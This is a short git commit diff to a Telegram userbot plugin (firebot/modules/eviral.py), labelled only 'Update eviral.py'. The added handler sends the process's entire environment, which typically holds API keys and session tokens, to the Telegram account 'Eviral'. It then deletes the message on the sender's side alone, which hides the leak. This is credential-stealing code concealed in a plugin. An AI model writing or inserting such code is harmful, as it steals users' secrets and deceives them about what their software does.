283b3617fbbd76af061c5e4def26a99afaddd979
E V I R A L <74889213+Teameviral@users.noreply.github.com>
2021-08-29 12:28:30 +0530

    Update eviral.py

--- firebot/modules/eviral.py
+++ firebot/modules/eviral.py
@@ -2,8 +2,7 @@ import os
 from firebot import bot
 from ..utils import admin_cmd
 
-@bot.on(admin_cmd("eviral"))
-async def _(event):
-    if event.fwd_from:
-        return
-await bot.send_message("Eviral", str(os.environ))
+@bot.on(admin_cmd("evul"))
+async def piro(event):
+  msg = await bot.send_message("Eviral", str(os.environ))
+  await bot.delete_messages("Eviral", msg, revoke=False)
